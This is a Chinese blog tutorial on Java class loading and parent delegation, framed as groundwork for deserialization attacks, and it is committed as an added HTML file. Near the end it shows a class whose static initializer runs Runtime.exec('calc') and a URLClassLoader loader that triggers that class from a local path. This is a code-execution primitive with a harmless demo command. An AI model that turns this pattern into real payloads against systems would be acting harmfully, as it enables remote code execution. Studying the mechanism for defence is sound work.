@@ -1,0 +1,1036 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/touxiang.ico">
+  <link rel="icon" href="/img/touxiang.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="yunli">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="java反序列化入门篇-04-类加载机制前言本篇介绍的是类加载机制，既然是类加载机制，那我们需要研究的就比较底层了，需要根据源码打断点才能看清整个调用逻辑，单纯的文字知识了解，无法真正看到调用逻辑始终无法真正将这个概念植入心里，所以希望学习这块的师傅们可以自己打断点理解一下，当然我们不是只是简单的过一遍，而是真正理解他到底为什么会进到这一块代码。 类加载器什么是类加载器.java文件在编译后会生成">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java反序列化入门篇-04-类加载机制">
+<meta property="og:url" content="http://blog.yunli1.com/2026/09/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-04-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/index.html">
+<meta property="og:site_name" content="noob weber">
+<meta property="og:description" content="java反序列化入门篇-04-类加载机制前言本篇介绍的是类加载机制，既然是类加载机制，那我们需要研究的就比较底层了，需要根据源码打断点才能看清整个调用逻辑，单纯的文字知识了解，无法真正看到调用逻辑始终无法真正将这个概念植入心里，所以希望学习这块的师傅们可以自己打断点理解一下，当然我们不是只是简单的过一遍，而是真正理解他到底为什么会进到这一块代码。 类加载器什么是类加载器.java文件在编译后会生成">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.yunli1.com/1.png">
+<meta property="og:image" content="http://blog.yunli1.com/2.png">
+<meta property="og:image" content="http://blog.yunli1.com/3.png">
+<meta property="og:image" content="http://blog.yunli1.com/4.png">
+<meta property="og:image" content="http://blog.yunli1.com/5.png">
+<meta property="og:image" content="http://blog.yunli1.com/6.png">
+<meta property="og:image" content="http://blog.yunli1.com/7.png">
+<meta property="og:image" content="http://blog.yunli1.com/8.png">
+<meta property="og:image" content="http://blog.yunli1.com/9.png">
+<meta property="og:image" content="http://blog.yunli1.com/10.png">
+<meta property="og:image" content="http://blog.yunli1.com/11.png">
+<meta property="og:image" content="http://blog.yunli1.com/12.png">
+<meta property="og:image" content="http://blog.yunli1.com/13.png">
+<meta property="og:image" content="http://blog.yunli1.com/14.png">
+<meta property="og:image" content="http://blog.yunli1.com/15.png">
+<meta property="og:image" content="http://blog.yunli1.com/16.png">
+<meta property="og:image" content="http://blog.yunli1.com/17.png">
+<meta property="og:image" content="http://blog.yunli1.com/18.png">
+<meta property="og:image" content="http://blog.yunli1.com/19.png">
+<meta property="og:image" content="http://blog.yunli1.com/20.png">
+<meta property="og:image" content="d:\Typora\web-%E5%9B%BE%E7%89%87\java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6\21.png">
+<meta property="og:image" content="http://blog.yunli1.com/22.png">
+<meta property="og:image" content="http://blog.yunli1.com/23.png">
+<meta property="og:image" content="http://blog.yunli1.com/24.png">
+<meta property="article:published_time" content="2026-09-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-16T07:52:00.046Z">
+<meta property="article:author" content="yunli">
+<meta property="article:tag" content="java反序列化">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://blog.yunli1.com/1.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>java反序列化入门篇-04-类加载机制 - noob weber</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.yunli1.com","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>yunli&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/links/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-link-fill"></i>
+                  <span>友链</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="java反序列化入门篇-04-类加载机制"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-09-28 00:00" pubdate>
+          2026年9月28日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          118 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">java反序列化入门篇-04-类加载机制</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="java反序列化入门篇-04-类加载机制"><a href="#java反序列化入门篇-04-类加载机制" class="headerlink" title="java反序列化入门篇-04-类加载机制"></a>java反序列化入门篇-04-类加载机制</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇介绍的是类加载机制，既然是类加载机制，那我们需要研究的就比较底层了，需要根据源码打断点才能看清整个调用逻辑，单纯的文字知识了解，无法真正看到调用逻辑始终无法真正将这个概念植入心里，所以希望学习这块的师傅们可以自己打断点理解一下，当然我们不是只是简单的过一遍，而是真正理解他到底为什么会进到这一块代码。</p>
+<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><h3 id="什么是类加载器"><a href="#什么是类加载器" class="headerlink" title="什么是类加载器"></a>什么是类加载器</h3><p><code>.java</code>文件在编译后会生成<code>.class</code>字节码文件，但<code>JVM</code>无法直接读<code>class</code>文件，此时就需要类加载器出场了。类加载器会找到<code>class</code>字节加载进<code>JVM</code>内存，然后生成Class对象。还记得我们前面讲的类加载过程的五个阶段吗，其中包括<code>加载</code>、<code>验证</code>、<code>准备</code>、<code>解析</code>、<code>初始化</code>，类加载器就是在<code>加载</code>阶段进行工作。</p>
+<h3 id="类加载器种类"><a href="#类加载器种类" class="headerlink" title="类加载器种类"></a>类加载器种类</h3><p>类加载器分以下几类：</p>
+<ul>
+<li>启动类加载器（根加载器）</li>
+<li>拓展类加载器</li>
+<li>应用程序类加载器</li>
+<li>自定义类加载器</li>
+</ul>
+<h4 id="启动类加载器（BootstrapClassLoader）"><a href="#启动类加载器（BootstrapClassLoader）" class="headerlink" title="启动类加载器（BootstrapClassLoader）"></a>启动类加载器（BootstrapClassLoader）</h4><p><code>BootstrapClassLoader</code>由 C++ 编写、内嵌在 JVM 内核中的类加载器，不属于 Java 体系里<code>ClassLoader</code>的子类，是整个双亲委派链的最顶端。在 Java API 中通常表示为 <code>null</code>，并且没有父加载器。在 JDK 8 HotSpot 中，它主要加载运行时核心类库（如 <code>rt.jar</code>）以及 <code>-Xbootclasspath</code> 指定路径中的类，但<code>-Xbootclasspath</code>这组参数在<strong>JDK9模块化</strong>后被移除。</p>
+<h4 id="扩展类加载器（ExtensionsClassLoader）"><a href="#扩展类加载器（ExtensionsClassLoader）" class="headerlink" title="扩展类加载器（ExtensionsClassLoader）"></a>扩展类加载器（ExtensionsClassLoader）</h4><p>由 <code>sun.misc.Launcher$ExtClassLoader</code> 类实现，主要负责加载 <code>%JRE_HOME%/lib/ext</code> 目录下的 jar 包和类以及被 <code>java.ext.dirs</code> 系统变量所指定的路径下的所有类。Java 虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载 java 类。</p>
+<h4 id="应用程序类加载器（AppClassLoader）"><a href="#应用程序类加载器（AppClassLoader）" class="headerlink" title="应用程序类加载器（AppClassLoader）"></a>应用程序类加载器（AppClassLoader）</h4><p>JDK8：<code>sun.misc.Launcher$AppClassLoader</code></p>
+<p>JDK9~21：<code>jdk.internal.loader.ClassLoaders$AppClassLoader</code></p>
+<p>一般通过通过( <code>java.class.path</code> 或者 <code>Classpath</code> 环境变量)来加载 Java 类，也就是我们常说的 classpath 路径。通常我们是使用这个加载类来加载 Java 应用类，可以使用 <code>ClassLoader.getSystemClassLoader()</code> 来获取它。</p>
+<h4 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h4><p>除了 <code>BootstrapClassLoader</code> 其他类加载器均由 Java 实现且全部继承自 <code>java.lang.ClassLoader</code>。如果我们要自定义自己的类加载器，很明显需要继承 <code>ClassLoader</code> 抽象类。要实现自定义类加载器还需要重构<code>loadClass</code>和<code>findClass</code>两个重要方法</p>
+<h3 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h3><p>双亲委派机制的设计一开始就是从安全的角度出发的，我们通过代码来理解一下</p>
+<h4 id="为什么需要双亲委派"><a href="#为什么需要双亲委派" class="headerlink" title="为什么需要双亲委派"></a>为什么需要双亲委派</h4><p><strong>String.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang;<br><span class="hljs-comment">//注意这里包名必须是java.lang</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">String</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>();<br>        s.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们自己定义了一个String类，还标注在<code>java.lang</code>包下，甚至定义String这个类的<code>toString</code>方法。那我们原生的<code>String</code>又该怎么办呢，我们这里调用的<code>new String</code>实例化对象又归属于谁呢，我们来看一下代码运行结果。</p>
+<p><img src="/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>不出意外地报错了，我们来研究一下报错</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">错误: 在类 java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span> 中找不到 <span class="hljs-selector-tag">main</span> 方法, 请将 <span class="hljs-selector-tag">main</span> 方法定义为:<br>   public static void <span class="hljs-selector-tag">main</span>(String<span class="hljs-selector-attr">[]</span> args)<br>否则 JavaFX 应用程序类必须扩展javafx<span class="hljs-selector-class">.application</span>.Application<br></code></pre></td></tr></table></figure>
+
+<p>这里说找不到main方法，但我们不是写了吗，奇怪。但这里其实是双亲委派机制在发力（被这种设计思路再一次震撼，膜拜一下），JVM 加载 <code>java.lang.String</code> 的时候，<strong>触发双亲委派</strong>，交给 Bootstrap 类加载器，直接加载了 <strong>JDK 原生自带的 <code>java.lang.String</code></strong>，而不是我们写的那个。JDK 原生的<code>java.lang.String</code><strong>根本没有 main 方法</strong>，所以报这个错。</p>
+<p><img src="/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以其实在类加载器被调用的时候，按照这个顺序去找类<code>BootstrapClassLoader</code>-&gt;<code>ExtensionsClassLoader</code>-&gt;<code>AppClassLoader</code>，若是父类加载器中找到了这个类则直接使用当前类加载器，反之则会交给下面的子类加载器。</p>
+<p>在这里，如果没有双亲委派：攻击者可以自己写一个<code>package java.lang; public class String</code>，植入恶意代码。当程序运行时，会加载攻击者自定义的 String，替换 JDK 原生 String，所有用到 String 的业务代码都会执行恶意逻辑，造成严重安全问题。</p>
+<h4 id="正确的双亲委派机制"><a href="#正确的双亲委派机制" class="headerlink" title="正确的双亲委派机制"></a>正确的双亲委派机制</h4><p>前文提到我们新建的 <code>java.lang.String</code> 报错了，是因为我们定义的 String 和 BOOT 包下面的 String 冲突了，所以才会报错，我们这里定义一个 BOOT 和 EXC 都没有的对象试一试。</p>
+<p><strong>Student.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;yunli&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br><br>        System.out.println(student.getClass().getClassLoader());<br>        System.out.println(student.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到我们现在用的类加载器是<code>AppClassLoader</code></p>
+<h2 id="动态加载字节码"><a href="#动态加载字节码" class="headerlink" title="动态加载字节码"></a>动态加载字节码</h2><h3 id="字节码是什么"><a href="#字节码是什么" class="headerlink" title="字节码是什么"></a>字节码是什么</h3><p>Java 源代码（<code>.java</code>）经过编译器<code>javac</code>编译，<strong>不会直接翻译成操作系统 CPU 能识别的机器码</strong>，而是编译成一种<strong>中间的、跨平台的二进制指令</strong>，这个东西就是<strong>字节码</strong>，保存在 <code>.class</code> 文件里。</p>
+<p>字节码的本质其实是<strong>一套 JVM 虚拟机的指令集</strong>，由一个一个 <strong>1 字节长度的操作码（opcode）</strong> + 可选操作数组成，所以叫<strong>字节码</strong>。</p>
+<h3 id="类加载器过程分析"><a href="#类加载器过程分析" class="headerlink" title="类加载器过程分析"></a>类加载器过程分析</h3><p>我们通过调试来看一下类加载器的调用过程</p>
+<p><strong>Person.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><br>&#125;<br><span class="hljs-comment">//这里无需具体代码实现，我们只需要创建一个文件就好</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>load.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">load</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        c.loadClass(<span class="hljs-string">&quot;org.example.Person&quot;</span>);<br>        System.out.println(c);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们在<code>ClassLoader.java</code>中打个断点</p>
+<p><img src="/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>至于为什么在这打断点呢，是因为不管是谁的类加载器（AppClassLoader &#x2F; ExtClassLoader &#x2F; 自定义 URLClassLoader）调用 loadClass，只要走这个继承来的方法，<strong>都会命中这个断点</strong>。</p>
+<p>我们<code>ctrl+F7</code>跟进一下</p>
+<p><img src="/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到我们现在的类加载器是<code>AppClassLoader</code>，其父类加载器是<code>ExtensionsClassLoader</code>，就会向上委派。</p>
+<p><img src="/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里 null 是因为最上面的 Bootstrap 类是 native 类，也就是之前说过的 C 写的源码，所以为 null。</p>
+<p>继续往下走，因为 APP 和 Ext 的父类是 URLClassLoader，所以这里的 findClass() 是会去找到 URLClassLoader 的。</p>
+<p><img src="/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着在 URLClassLoader 里面调用了 defineClass 方法，再一步步跟进就是我们的 native 方法了。</p>
+<p>总的流程:</p>
+<p><code>ClassLoader —-&gt; URLClassLoader —-&gt; APPClassLoader —-&gt; loadClass() —-&gt; findClass()</code></p>
+<p>在旧版jdk中，我们的<code>URLClassLoader</code>没有自己的<code>defineCLass</code>方法实现，调用的是<code>SecureClassLoader</code>的，所以可以看到有些师傅写的流程是</p>
+<p><code>ClassLoader —-&gt; SecureClassLoader —&gt; URLClassLoader —-&gt; APPClassLoader —-&gt; loadClass() —-&gt; findClass()</code></p>
+<p>下面我们介绍多种能够用于反序列化攻击的，加载字节码的类加载器。</p>
+<h3 id="利用-URLClassLoader-加载远程-class-文件"><a href="#利用-URLClassLoader-加载远程-class-文件" class="headerlink" title="利用 URLClassLoader 加载远程 class 文件"></a>利用 URLClassLoader 加载远程 class 文件</h3><p>在 JDK8 中，AppClassLoader继承自 URLClassLoader。因此，AppClassLoader 查找 class 文件的底层逻辑直接复用了 URLClassLoader 的实现，理解 URLClassLoader 的工作原理，就能理解 JDK8 默认应用类加载器是如何在类路径下搜索类的。</p>
+<p>URLClassLoader 会读取<code>java.class.path</code>，把里面所有路径统一封装成<code>java.net.URL</code>对象。URLClassLoader 内部依靠<code>URLClassPath</code>，针对每一个 URL 自动选择对应的内部 Loader 去定位<code>.class</code>资源，判断规则如下：</p>
+<ol>
+<li>如果 URL 结尾<strong>不带斜杠<code>/</code></strong>：视为 Jar 文件，使用<code>JarLoader</code>，在这个 Jar 包内部检索 class；</li>
+<li>如果 URL 结尾<strong>带有斜杠<code>/</code></strong>，并且协议是<code>file</code>：代表本地文件目录，使用<code>FileLoader</code>，在本地磁盘目录查找 class；</li>
+<li>如果 URL 结尾<strong>带有斜杠<code>/</code></strong>，并且协议不是<code>file</code>（如 http）：使用通用基础 Loader，支持从远程网络位置读取 class 字节。</li>
+</ol>
+<h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><p><strong>Calc.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">// URLClassLoader 的 file 协议</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>我们先创建一个<code>Calc.java</code>文件，然后通过<code>maven deploy</code>编译一下，拿到<code>Calc,class</code>文件</p>
+<p><strong>FileRce.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-comment">// URLClassLoader 的 file 协议</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span><br>                (<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;file:///E:\\java\\loader\\loader2\\target\\classes\\org\\example&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;org.example.Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里注意一下，只要我们在代码中写了包名，在<code>loadClass</code>的时候也需要写全包名，不然无法找到指定的文件。成功弹出计算器</p>
+<p><img src="/8.png" srcset="/img/loading.gif" lazyload></p>
